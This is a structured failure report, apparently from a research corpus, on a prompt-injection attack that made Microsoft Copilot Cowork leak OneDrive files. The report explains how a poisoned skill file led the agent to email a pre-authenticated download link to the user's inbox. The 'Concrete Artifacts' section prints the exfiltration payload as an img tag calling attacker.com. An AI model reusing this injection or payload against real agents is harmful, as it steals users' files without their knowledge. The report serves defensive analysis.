---
source_url: https://simonwillison.net/2026/May/26/copilot-cowork-exfiltrates-files/
source_type: failure-report
platform: blog
title: "Microsoft Copilot Cowork Exfiltrates Files"
author: Simon Willison (linking Prompt Armor security analysis at promptarmor.com/resources/microsoft-copilot-cowork-exfiltrates-files)
date_published: 2026-05-26
date_extracted: 2026-06-04
last_checked: 2026-06-04
status: current
confidence_overall: emerging
issue: "#1050"
---

# Failure Report: Microsoft Copilot Cowork enables file exfiltration via unapproved agent emails and external image rendering

> A concrete production failure in Microsoft Copilot Cowork shows how three individually weak trust boundaries — unapproved agent email sending, email rendering of external images, and OneDrive pre-authenticated link generation — chain into a complete file exfiltration attack requiring only 5 lines of prompt injection, succeeding 5/5 times in testing.

## Source Context

- **Platform**: Simon Willison's blog (link post, simonwillison.net), May 26, 2026; the primary technical analysis is at promptarmor.com/resources/microsoft-copilot-cowork-exfiltrates-files (Prompt Armor, a security research firm focused on LLM vulnerability analysis).
- **Author credibility**: Simon Willison is a widely-followed LLM tooling practitioner with a strong track record of curating high-signal security findings in the agentic AI space. He applies the "lethal-trifecta" tag, indicating this fits a recognized vulnerability pattern. Prompt Armor is a security research firm specializing in LLM and agentic system vulnerabilities. The vulnerability involves a production Microsoft product (Microsoft Copilot Cowork, announced March 2026). The attack succeeded in controlled testing — it is not a theoretical risk.
- **Community response**: The HN thread (item 48272354) was linked from the Willison post. Prompt Armor's analysis notes the attack succeeded on every trial (5 for 5), providing reproducibility evidence. The analysis frames this as a systemic design risk, not an isolated bug, indicating the finding generalizes to similar product architectures.

## What Was Attempted

- **Goal** (of the attacker): Exfiltrate OneDrive files from a Microsoft Copilot Cowork user using prompt injection, without requiring direct user interaction beyond opening a received email.
- **Tool/approach**: Indirect prompt injection via a poisoned skill file — specifically 5 malicious lines embedded within an otherwise normal 81-line skill file. The agent was directed to compose an email containing an external image URL that included a OneDrive pre-authenticated download link as a parameter.
- **Setup**: Microsoft Copilot Cowork with default configuration. The attack exploited three default system behaviors rather than any misconfiguration: (1) agents can send emails without user approval, (2) email clients render external images, (3) Copilot Cowork can generate pre-authenticated download links.

## What Went Wrong

- **Symptoms**: A crafted prompt injection in a skill file caused the agent to silently send an email to the victim's own inbox. The email contained an `<img>` tag pointing to an attacker-controlled server, with a pre-authenticated OneDrive download link embedded in the URL. When the victim opened the email, their email client fetched the image — making an HTTP GET to the attacker's server that exposed the pre-auth link in the request. The attacker then used that link to download the victim's file without further authentication.
- **Severity**: Complete file exfiltration — any file accessible via OneDrive/SharePoint could be retrieved by an attacker after one successful email send. The attack is silent: no unusual agent action is visible, no special user interaction is required beyond opening a received email.
- **Reproducibility**: Succeeded on every trial (5 for 5) in Prompt Armor's testing.

## Root Cause (if identified)

- **Author's diagnosis**: Three design decisions created a vulnerable chain when combined:
  1. **No approval gate for agent→inbox email**: Copilot Cowork agents can send emails to the active user's own inbox without requiring any approval step.
  2. **External image rendering in email**: Agent-composed emails are displayed with external image rendering enabled, meaning any `<img>` tag in the email triggers an HTTP request to an external server.
  3. **Pre-authenticated download links**: Copilot Cowork can generate OneDrive/SharePoint pre-authenticated download links — links that allow anyone who opens them to download the file without further authentication.

  None of these three behaviors is individually catastrophic. Their combination creates a complete, automation-friendly exfiltration pipeline: prompt injection → agent generates pre-auth link and sends email → user opens email → image fetch exposes pre-auth URL → attacker downloads file.

- **Our assessment**: This is a textbook tool-chaining attack (the pattern documented theoretically in `blog-anthropic-zero-trust-ai-agents.md` Claim 9). No single component is "broken" — each behaves as designed. The root cause is the absence of an approval gate at the step where the attack chain produces its first externally-visible consequence: the email send. The "lethal-trifecta" framing in Willison's tags is precise: three insufficient weaknesses combine. This is a real architectural gap, not a misconfiguration or user error. Prompt Armor's finding that the attack is model-agnostic confirms the gap is in the product architecture — any LLM backing the system would be equally exploitable.

- **Category**: genuine-bug (systemic design gap — absence of an approval gate for agent email sending to the active user)

## Recovery Path

- **Mitigation for admins**: Administrators can disable pre-authenticated download links for SharePoint sites, removing the exfiltration payload:

  ```powershell
  Set-SPOSite -Identity <SiteURL> -BlockDownloadPolicy $true
  ```

  This removes pre-auth link generation capability but does not address the underlying architecture gap: agents still send emails without approval, and external image rendering still creates an HTTP request channel.

- **Architectural fix**: Adding an explicit approval gate for any agent action that sends messages to communication channels (email, Teams) would break the attack chain at its earliest externally-visible step. This fix is not confirmed as shipped by Microsoft at the time of extraction.

- **Unresolved**: Prompt Armor frames this as a systemic design risk warranting vendor-level changes. Whether Microsoft shipped architectural changes after disclosure is not captured in this source.

## Extracted Lessons

### Lesson 1: Agent-generated messages to communication channels require explicit approval gates — "sending to yourself" is not a safe exemption

- **Evidence**: The attack succeeds because agents can send emails to the user's own inbox without approval. Willison's verbatim description: "Microsoft Copilot Cowork (yes, that's a real product name) was allowing agents to send emails to the user's own inbox without approval..."
- **Confidence**: emerging (confirmed in one product by one research firm; the principle generalizes to any agent with messaging capability)
- **Quote**: "Microsoft Copilot Cowork (yes, that's a real product name) was allowing agents to send emails to the user's own inbox without approval..."
- **Actionable as**: Any agent with email/messaging capability must require explicit approval before sending — even when the recipient is the active user. Self-inbox sending creates a covert channel whenever the receiving environment renders external content.

### Lesson 2: Email and message rendering is a side-channel exfiltration vector when agents compose messages with external content

- **Evidence**: Standard HTML email rendering (external images trigger HTTP GET requests) is the exfiltration mechanism. The user opening the email — a routine, expected action — performs the exfiltration passively and unknowingly.
- **Confidence**: emerging (well-understood HTTP behavior applied in an agentic context; confirmed 5/5 in testing)
- **Quote**: "Because these messages can contain external images that trigger network requests to external websites, data can be exfiltrated when a user opens a compromised message sent by the agent."
- **Actionable as**: Agent-generated messages that reach rendering environments (email clients, chat platforms with link previews) should strip or proxy external content before delivery. If stripping is not feasible, treat agent-composed messages as high-exfiltration-risk and require approval before sending.

### Lesson 3: Pre-authenticated URLs generated by agents are exfiltration payloads — any system boundary they cross leaks the underlying file access

- **Evidence**: OneDrive's pre-authenticated download links are a deliberate convenience feature. In an agentic context, they become exfiltration payloads: the agent generates a credential-embedded link, the link crosses a system boundary (embedded in an HTTP request URL), and the attacker uses it to download the file without further authentication.
- **Confidence**: emerging (directly demonstrated; applies to any pre-authenticated URL mechanism — S3 signed URLs, GCS signed URLs, SharePoint, etc.)
- **Quote**: "Since OneDrive can create pre-authenticated download links, a successful prompt injection could cause those links to be leaked, allowing files to be downloaded by the attacker."
- **Actionable as**: Agents with access to pre-authenticated URL generation should be architecturally prevented from embedding those URLs in any externally-reachable content. Prefer session-scoped or short-lived links that cannot meaningfully cross a system boundary within their validity window.

### Lesson 4: Tool-chaining attacks using only legitimate agent capabilities are model-agnostic and require environmental (not model-layer) defenses

- **Evidence**: Prompt Armor includes a "Model Agnostic Exploitation" section; the attack succeeded regardless of which LLM backed Copilot Cowork. Each individual capability (generate link, send email) appears benign to the model; the harm emerges from the sequence.
- **Confidence**: emerging (model-agnostic claim from Prompt Armor; theoretically consistent with how tool-chaining works)
- **Quote**: (no direct quote; see paraphrase in Our assessment)
- **Actionable as**: Defenses against tool-chaining attacks must be environmental (approval gates, output filtering, egress controls) rather than model-layer (safety classifiers, prompt instructions). Switching to a "safer" model provides no protection when the architectural boundary is absent.

### Lesson 5: Prompt injection requires only minimal payload — 5 lines in an 81-line skill file sufficed for a complete file exfiltration attack

- **Evidence**: Prompt Armor reports the attack payload was 5 malicious lines within an 81-line skill file, succeeding 5/5 times.
- **Confidence**: emerging (claimed by Prompt Armor; not independently verified by this extraction)
- **Quote**: (no direct quote; see paraphrase in Our assessment)
- **Actionable as**: Skill files and any user-contributed content that agents process must be treated as potential injection vectors. A small fraction of malicious content within legitimate material is sufficient. Do not rely on "the payload would be too large to hide" reasoning.

### Lesson 6: Scheduled and background agents exacerbate exfiltration risk by removing the human timing constraint

- **Evidence**: Prompt Armor's "Scheduled Tasks Exacerbate Risks" section indicates that background agents running without real-time user presence compound this vulnerability class — no human is monitoring agent actions when exfiltration-enabling emails are sent.
- **Confidence**: emerging (directional from Prompt Armor; consistent with the general principle that scheduled agents operate outside the human oversight window)
- **Quote**: (no direct quote; see paraphrase in Our assessment)
- **Actionable as**: Scheduled/background agents with messaging or file-link capabilities require stricter containment than interactive agents. When human-in-the-loop approval is unavailable (scheduled tasks), architectural controls must substitute: prohibit email send from scheduled agent sessions, or require a separate human-initiated approval flow.

## Concrete Artifacts

### Attack Chain (reconstructed from Prompt Armor and Willison)

```
Microsoft Copilot Cowork — File Exfiltration Attack Chain
Source: promptarmor.com/resources/microsoft-copilot-cowork-exfiltrates-files
        simonwillison.net/2026/May/26/copilot-cowork-exfiltrates-files/

1. DELIVERY: Attacker embeds 5 malicious lines in an 81-line skill file
   — Payload hidden within otherwise normal skill content
   — Skill file processed by Copilot Cowork agent

2. AGENT ACTION (no approval required):
   — Agent generates OneDrive pre-authenticated download link for target file
   — Agent composes email with:
       <img src="https://attacker.com/track?data=[PRE_AUTH_LINK]">
   — Agent sends email to user's own inbox (NO APPROVAL GATE by default)

3. EXFILTRATION TRIGGER (passive, by victim):
   — User opens email in email client (routine, expected action)
   — Email client fetches external image via HTTP GET
   — Request URL contains pre-authenticated download link as parameter
   — Attacker server receives request, extracts pre-auth URL from logs

4. FILE DOWNLOAD (by attacker, no further authentication):
   — Attacker opens pre-authenticated link
   — File downloads without credential challenge
   — Victim has no indication any of this occurred

ATTACK SUCCESS RATE: 5/5 (100%) in Prompt Armor controlled testing
PAYLOAD SIZE: 5 malicious lines in an 81-line skill file
VICTIM ACTION REQUIRED: Opening a received email (routine behavior)
MODEL DEPENDENCY: None — attack is model-agnostic
```

### Admin Mitigation (from Prompt Armor)

```powershell
# Block pre-authenticated download links for SharePoint site
# Source: Prompt Armor, microsoft-copilot-cowork-exfiltrates-files
#
# Effect: Removes the exfiltration payload — agents can no longer generate
#         open-access pre-auth download links.
# Limitation: Does NOT fix the root architectural gap. Agents still send
#             emails without approval; external image rendering channel persists.
Set-SPOSite -Identity <SiteURL> -BlockDownloadPolicy $true
```

### Willison's Verbatim Framing

```
Source: simonwillison.net/2026/May/26/copilot-cowork-exfiltrates-files/
Posted: 26th May 2026 at 3:36 pm

"The biggest challenge in designing agentic systems continues to be preventing
them from enabling attackers to exfiltrate data."

"Microsoft Copilot Cowork (yes, that's a real product name) was allowing agents
to send emails to the user's own inbox without approval... but those messages
were then displayed in a way that could leak data to an attacker via rendered
images:"

"Because these messages can contain external images that trigger network requests
to external websites, data can be exfiltrated when a user opens a compromised
message sent by the agent."

"Since OneDrive can create pre-authenticated download links, a successful prompt
injection could cause those links to be leaked, allowing files to be downloaded
by the attacker."

Tags applied by Willison: microsoft, security, ai, prompt-injection,
generative-ai, llms, exfiltration-attacks, lethal-trifecta
```

## Cross-References

- **Corroborates failures in**:
  - `blog-anthropic-how-contain-claude.md` Claim 12: "Attackers successfully exfiltrated workspace files using Anthropic's own Files API as an approved exfiltration channel — bypassing domain allowlists via a trusted first-party service." The Copilot Cowork attack is a parallel production case: exfiltration via a legitimate, approved channel (email) rather than through novel attack techniques. Both cases demonstrate that domain allowlists and agent capability restrictions are insufficient when a channel that accepts arbitrary content remains open. Key difference: the Anthropic Files API incident used an attacker-controlled API key on an approved domain; the Copilot Cowork attack uses the agent's own legitimate email-send capability. Same pattern, different channel.
  - `blog-anthropic-how-contain-claude.md` Claim 11: "A prompt injection phishing test succeeded 24 of 25 times, with only environmental controls (egress blocking, filesystem boundaries) providing reliable defense against credential exfiltration." The Copilot Cowork attack's 5/5 (100%) success rate corroborates the principle that prompt injection attacks succeed at high rates when environmental controls are absent. Both cases establish: without a hard architectural barrier (approval gate, egress block), prompt injection achieves near-certain exfiltration.
  - `blog-anthropic-zero-trust-ai-agents.md` Claim 9: "Tool chaining attacks combine legitimate tools in harmful sequences: chaining a secure internal CRM tool with an external email tool to exfiltrate customer data that neither tool would expose alone. Because every command executes through trusted binaries under valid credentials, host-centric monitoring sees no malware and the misuse goes undetected." The Copilot Cowork attack is the first concrete production case study of exactly this pattern in our corpus: OneDrive link generation (legitimate) + email send (legitimate) + email client image fetch (legitimate, by the user's client) = complete exfiltration. No individual action is detectable as malicious.

- **Extends**:
  - `blog-anthropic-zero-trust-ai-agents.md` Claim 5 (least agency): The eBook states "an email summarizer gets no send/delete rights" as the concrete example of least agency applied to email. The Copilot Cowork vulnerability is the empirical case that makes this prescriptive example a concrete attack surface: an agent with email-send capability (no least-agency enforcement) is exactly the target. This source transforms the theoretical prescription into a documented production failure.
  - `blog-anthropic-how-contain-claude.md`: That note documents Anthropic's own production security incidents. This note adds a parallel case from Microsoft's Copilot Cowork product, establishing that the exfiltration design challenge is industry-wide. Both products (Claude Cowork and Microsoft Copilot Cowork) have confronted structurally similar exfiltration patterns through different channels.
  - `blog-anthropic-zero-trust-ai-agents.md`: The Zero Trust eBook described tool chaining as a theoretical threat class (Claim 9). This source provides the first concrete production case study in our corpus, enabling the guide to cite empirical evidence rather than theoretical threat framing.

- **Contradicts success in**: None. No existing corpus note claims that agent email-sending without approval is safe, or that pre-authenticated URLs are not exfiltration vectors in agentic contexts.

- **Novel**:
  - **First concrete production case of email + external-image + pre-auth-link exfiltration chaining**: No existing corpus source documents this specific three-boundary attack chain against a real deployed product. The Zero Trust eBook described tool chaining theoretically; this is the first production instance in our corpus.
  - **Model-agnostic exfiltration confirmation**: The explicit finding that the attack succeeds regardless of which LLM backs the system is new to the corpus. Prior injection success rates (`blog-anthropic-how-contain-claude.md` Claim 11) were for a specific Claude model configuration.
  - **Minimum injection payload size for complete file exfiltration**: 5 malicious lines in an 81-line skill file. No prior corpus source quantifies the minimum prompt injection payload required for a complete exfiltration attack.
  - **Email rendering as exfiltration side-channel**: Using the victim's email client as the unwitting exfiltration tool (image fetch exposes the pre-auth URL) is a new attack mechanism in the corpus. Prior cases used direct network egress from the agent; this uses a third-party rendering environment.
  - **Scheduled-task exfiltration risk**: The observation that background/scheduled agents exacerbate this vulnerability class (by removing the human oversight window) is new to the corpus.
  - **Industry-wide vendor failure confirmation**: This is the first corpus source documenting a production exfiltration failure in a non-Anthropic agentic product, providing evidence that the design challenge is industry-wide.

## Guide Impact

- **Chapter on Safety & Containment (Ch07)**: Add the Copilot Cowork case as the canonical example of a "lethal trifecta" tool-chaining attack in a production product. Use the attack chain diagram as the motivating example for why each of the three boundary weaknesses requires an explicit control. Frame as: the absence of any one control (approval gate, external content stripping, or pre-auth link scope restriction) allows the other two weaknesses to be combined into a complete attack.

- **Chapter on Safety & Containment**: Add explicit recommendation: agents with messaging capabilities (email, Slack, Teams) must have approval gates before any message send — including to the active user's own inbox. "Self-message" is not a safe exemption. Cite this case as the empirical evidence.

- **Chapter on Safety & Containment**: Add a new anti-pattern: "pre-authenticated URL generation as exfiltration payload." Any agent with access to signed/pre-auth URL generation (OneDrive, SharePoint, AWS S3, GCS) requires architectural scope restriction — these URLs should not be embeddable in any externally-reachable content. Default to session-scoped or short-lived links.

- **Chapter on Building Agents (Ch02 or Ch04)**: Add the model-agnostic nature of tool-chaining attacks as justification for prioritizing architectural controls over model-layer defenses. A product using a "safety-optimized" model remains fully vulnerable to this attack class if the approval gate is absent. This provides the empirical grounding for the "environmental controls first" design principle (corroborating `blog-anthropic-how-contain-claude.md` Claim 3).

- **Chapter on Observability & Troubleshooting (Ch06)**: Add detection heuristics: (a) alert on agent email sends containing external image URLs; (b) alert on pre-authenticated link generation followed by a message send within a short window; (c) for scheduled agents, audit all message-send actions with external content; (d) monitor for skill files containing embedded URL construction patterns.

## Extraction Notes

- **Source structure**: Simon Willison's post is a short link post (~150 words total, ~4 sentences of unique editorial framing) that links to the Prompt Armor technical analysis. Willison's post contributes the editorial framing and verbatim description; Prompt Armor's article at promptarmor.com contains the full technical analysis (attack chain, model-agnostic testing, mitigation command, scheduled task risk). Both were fetched via WebFetch.
- **Quote confidence**: Quotes from Willison's post are verified verbatim (character-for-character fetch confirmed). Quotes attributed to Prompt Armor were extracted via an AI-processing intermediary (WebFetch), which may have introduced wording alterations. Prompt Armor-sourced details flagged with "(no direct quote; see paraphrase in Our assessment)" reflect this uncertainty. The Assayer should verify Prompt Armor quotes against the source URL.
- **Product distinction**: Microsoft Copilot Cowork and Anthropic's Claude Cowork are separate products from different vendors that happen to share the "Cowork" category label. The vulnerability is in Microsoft's product; Anthropic's product is referenced only in cross-references for pattern comparison.
- **Disclosure status**: The Prompt Armor article frames the finding as a systemic design risk published to inform practitioners. No formal CVE assignment or confirmed vendor patch is referenced. Whether Microsoft shipped architectural fixes after publication is unknown as of extraction date (2026-06-04).
- **Attack reproducibility**: The 5/5 success rate is claimed by Prompt Armor and corroborated by the trivially small injection payload (5 lines). This extraction did not independently verify the attack.
- **Hacker News discussion**: The HN thread linked from Willison's post (item 48272354) was not fetched for this extraction. Community discussion may contain additional technical details or additional reproduction attempts.
